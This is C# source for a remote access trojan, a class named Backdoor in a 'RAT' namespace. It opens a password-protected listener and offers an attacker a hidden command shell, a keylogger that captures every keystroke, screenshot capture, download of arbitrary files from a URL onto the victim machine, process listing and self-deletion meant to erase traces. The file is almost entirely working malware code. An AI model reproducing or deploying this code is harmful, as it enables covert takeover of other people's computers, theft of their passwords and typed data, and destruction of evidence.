using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using RAT;
using System.Collections.Generic;

namespace RAT
{
    public class Backdoor
    {
        int ScreenshotPort = 1336;

        int Port { get; set; }
        string Name { get; set; }
        string Password { get; set; }
        bool Verbose { get; set; }

        bool Alive { get; set; }

        TcpListener Listener;
        Socket Socket;
        StreamReader InStream;
        StreamWriter OutStream;

        Thread KeyloggerThread;
        KeyLogger Keylogger;

        List<RCmd> availableCommands;
        delegate void RatAction(StreamReader input, StreamWriter output, bool verbose);

        public Backdoor(int port = 1337, string serverName = "RAT", string password = "P455wD", bool verbose = true)
        {
            this.Port = port;
            this.Name = serverName;
            this.Password = password;
            this.Verbose = verbose;

            GenerateHelp();
        }

        void GenerateHelp()
        {
            availableCommands = new List<RCmd>()
        {
        new RCmd() {Name = "screenshot",        Command = C_Screenshot,     Help="Takes screenshot and then hosts it at given port as HTTP"},
        new RCmd() {Name= "shell",             Command=C_Shell,             Help="Opens standard windows interactive command line"},
        new RCmd() {Name= "keylogger-start",   Command=C_KeyLoggerStart,    Help="Enable saving EVERY keystroke at remote machine"},
        new RCmd() {Name= "keylogger-dump",    Command=C_KeyLoggerDump,     Help="Stops the interception process and sends results back"},
        new RCmd() {Name= "show-message",      Command=C_ShowMessage,       Help="Displays MessageBox on the remote machines screen"},
        new RCmd() {Name= "download-file",     Command=C_DownloadFile,      Help="Connects with internet and downloads file to the rat directory"},
        new RCmd() {Name= "self-delete",       Command=C_SelfDelete,        Help="Vanishes, kills every proof of self existence"},
        new RCmd() {Name= "list-processes",    Command=C_ListProcesses,     Help="Displays ID,Name and window name of every running process"},
        new RCmd() {Name= "change-wallpaper",  Command=C_ChangeWallpaper,   Help="Changes wallpaper to one from internet" },
        new RCmd() {Name= "q",                 Command=C_Quit,              Help="Disconnects from the terminal (only current session)" }
        };
        }

        class RCmd
        {
            public string Name { get; set; }
            public string Help { get; set; }
            public RatAction Command { get; set; }
        }

        public void Start()
        {
            Alive = true;
            Console.Title = Name + " : " + Port;
            try
            {
                if (Verbose) Log("Listening on port " + Port);

                Listener = new TcpListener(IPAddress.Any, Port);
                Listener.Start();
            }
            catch (Exception e)
            {
                Log(e.ToString());
            }
        }

        public void NextConnection()
        {
            Alive = true;
            try
            {
                Socket = Listener.AcceptSocket();

                if (Verbose) Log("Client connected: " + Socket.RemoteEndPoint);

                Stream s = new NetworkStream(Socket);
                InStream = new StreamReader(s, Encoding.ASCII);
                OutStream = new StreamWriter(s, Encoding.ASCII);
                OutStream.AutoFlush = true;

                OutStream.WriteLine("Pswd:");
                string checkPass = InStream.ReadLine();

                if (Verbose) Log("Client tried password " + checkPass);
                if (!checkPass.Equals(Password))
                {
                    if (Verbose) Log("Incorrect Password");
                    DropConnection();
                    return;
                }
                if (Verbose) Log("Password Accepted.");

                // welcome message
                OutStream.WriteLine(StringExtensions.AlignCenter(String.Format("  Welcome to {0} RAT  ", Name), 80, '='));
                OutStream.WriteLine(StringExtensions.AlignCenter("  SINGLE-USER MODE  ", 80, '='));

                // input loop
                string input = "";
                while (Alive && ((input = InStream.ReadLine()) != null))
                {
                    if (Verbose) Log(">> " + input);
                    HandleCommand(input);
                }
            }
            catch (Exception e)
            {
                Log("<ERROR> Something happened:");
                Log(e.ToString());
                DropConnection();
            }
        }

        public void Stop()
        {
            Listener.Stop();
        }

        void HandleCommand(string command)
        {
            bool handled = false;

            if (command.Equals("help"))
            {
                DisplayHelp(OutStream);
                handled = true;
            }

            foreach (var action in availableCommands)
            {
                if (action.Name.Equals(command))
                {
                    action.Command(InStream, OutStream, Verbose);
                    handled = true;
                    break;
                }
            }
            if (!handled)
            {
                OutStream.WriteLine("no such command. Type \"help\" for more information");
            }
        }

        void DisplayHelp(StreamWriter outStream)
        {
            outStream.WriteLine(StringExtensions.GenerateNStrings(80, "-"));
            outStream.WriteLine(StringExtensions.AlignCenter("  H E L P  ", 80, '-'));
            outStream.WriteLine(StringExtensions.GenerateNStrings(80, "-") + "\r\n");

            foreach (var entry in availableCommands)
            {
                outStream.WriteLine(String.Format("{0}  - {1}", entry.Name, entry.Help));
            }
            outStream.WriteLine("\r\n" + StringExtensions.GenerateNStrings(80, "-"));
        }

        public void DropConnection()
        {
            if (Verbose) Log("Dropping Connection");
            InStream.Dispose();
            OutStream.Dispose();
            Socket.Shutdown(SocketShutdown.Both);
            if (Verbose) Log("Client Disconnected");
        }

        static void Log(string message)
        {
            Console.WriteLine(message);
        }

        #region commands
        public void C_Screenshot(StreamReader inStream, StreamWriter outStream, bool verbose)
        {
            if (verbose) outStream.WriteLine("Taking a screenshot...");
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "ppppp.png");
            WindowsHelper.MakeScreenshot(path);

            Log("Image is hosted at port 2790");
            outStream.WriteLine("Image is hosted at port " + ScreenshotPort);
            NetworkHelper.HostImage(path, Log, ScreenshotPort);
            Log("Image Sent < OK > !");
            // delete all proofs
            File.Delete(path);
            Log("Image deleted");
            if (verbose) outStream.WriteLine("Screenshot downloaded and deleted successfully!");
        }

        public void C_Shell(StreamReader inStream, StreamWriter outStream, bool verbose)
        {
            try
            {
                using (Process ShellProc = new Process())
                {
                    ProcessStartInfo pInfo = new ProcessStartInfo("cmd")
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardError = true,
                        RedirectStandardInput = true,
                        RedirectStandardOutput = true
                    };
                    ShellProc.StartInfo = pInfo;
                    ShellProc.Start();

                    var ToShell = ShellProc.StandardInput;
                    var FromShell = ShellProc.StandardOutput;
                    ToShell.AutoFlush = true;

                    bool read = true;

                    // thread for sending shell output to the user
                    new Thread(delegate ()
                    {
                        string shellOutBuffer = "";
                        try
                        {
                            while (read && (shellOutBuffer = FromShell.ReadLine()) != null)
                            {
                                outStream.WriteLine(shellOutBuffer + "\r");

                                {
                                    // temporary, for logging
                                    Console.ForegroundColor = ConsoleColor.Cyan;
                                    Log(shellOutBuffer);
                                    Console.ResetColor();
                                }
                            }
                        }
                        catch (ObjectDisposedException) { /* its ok, OutStream will throw it when use enter "q" */ }
                    }).Start();

                    string buffer = "";
                    while (((buffer = inStream.ReadLine()) != null) && buffer != "q" && buffer != "exit")
                    {
                        ToShell.WriteLine(buffer + "\r\n");
                    }
                    read = false;
                }
            }
            catch (Exception e)
            {
                outStream.WriteLine(e);
                Log(e.ToString());
            }
            outStream.WriteLine("==== Shell exited! ====");
            if (verbose) Log("Shell exit");
        }

        public void C_KeyLoggerStart(StreamReader inStream, StreamWriter outStream, bool verbose)
        {
            if (Keylogger != null) { return; }

            Keylogger = new KeyLogger();
            KeyloggerThread = new Thread(new ThreadStart(Keylogger.Start));
            KeyloggerThread.Start();
        }

        public void C_KeyLoggerDump(StreamReader inStream, StreamWriter outStream, bool verbose)
        {
            string dump = Keylogger.StopAndDump();
            KeyloggerThread.Abort();
            KeyloggerThread = null;
            outStream.WriteLine("Captured input:");
            outStream.WriteLine(dump);
        }

        public void C_ShowMessage(StreamReader inStream, StreamWriter outStream, bool verbose)
        {
            outStream.WriteLine("Title:");
            string title = inStream.ReadLine();
            outStream.WriteLine("Content");
            string content = inStream.ReadLine();

            outStream.WriteLine(string.Format("Do you really want to show message:\r\n=========\r\n{0}\r\n========\r\n{1}\r\n\r\n[Y/N]", title, content));
            string response = inStream.ReadLine();
            if (response.Equals("y"))
            {
                outStream.WriteLine("Message shown");
                new Thread(delegate () { MessageBox.Show(content, title, MessageBoxButtons.OK); }).Start();
                Log("Message shown");
            }
            else
            {
                Log("Message denied");
                outStream.WriteLine("MessageBox showing denied by the user");
            }
        }

        public void C_DownloadFile(StreamReader inStream, StreamWriter outStream, bool verbose)
        {
            outStream.WriteLine("Enter URL of desired file to download:");
            string url = inStream.ReadLine();
            outStream.WriteLine("FileName/Path on remote computer:");
            string filePath = inStream.ReadLine();
            try
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile(url, filePath);
                }
                outStream.WriteLine("File downloaded successfully");
                Log("File downloaded successfully");
            }
            catch (Exception e)
            {
                if (Verbose) Log("Exception during file download:");
                outStream.WriteLine("Exception during file download:" + e);
                Log(e.ToString());
            }
        }

        public void C_SelfDelete(StreamReader inStream, StreamWriter outStream, bool verbose)
        {
            outStream.WriteLine("Are you sure, that you want to delete the backdoor? [Y/N]");
            var question = inStream.ReadLine();
            if (question.Equals("y"))
            {
                Log("Performing self-deletion");
                outStream.WriteLine("Goodbye my friend!");
                WindowsHelper.SelfDelete();
                DropConnection();
                Environment.Exit(0);
            }
        }

        public void C_ListProcesses(StreamReader inStream, StreamWriter outStream, bool verbose)
        {
            Process[] allProcesses = Process.GetProcesses();
            foreach (Process process in allProcesses)
            {
                string pString = string.Empty;

                if (!string.IsNullOrEmpty(process.MainWindowTitle))
                {
                    pString = string.Format("#{0} \t{1} T::", process.Id, process.ProcessName, process.MainWindowTitle);
                }
                else
                {
                    pString = string.Format("#{0} \t{1} ", process.Id, process.ProcessName);
                }
                outStream.WriteLine(pString);
            }
        }

        public void C_ChangeWallpaper(StreamReader inStream, StreamWriter outStream, bool verbose)
        {
            outStream.WriteLine("Enter the uri of new wallpaper:");
            var uri = inStream.ReadLine();
            try
            {
                WindowsHelper.Wallpaper.SetTo(new Uri(uri), WindowsHelper.Wallpaper.Style.Centered);
                outStream.WriteLine("\r\nWallpaper set!");
                Log("Wallpaper set!");
            }
            catch (Exception e)
            {
                outStream.WriteLine("Some error when setting wallpaper:\r\n" + e);
                Log("<ERROR> when setting wallpaper:" + e);
            }
        }

        public void C_Quit(StreamReader inStream, StreamWriter oOutStream, bool verbose)
        {
            oOutStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
            DropConnection();
            Alive = false;
        }
        #endregion commands
    }
}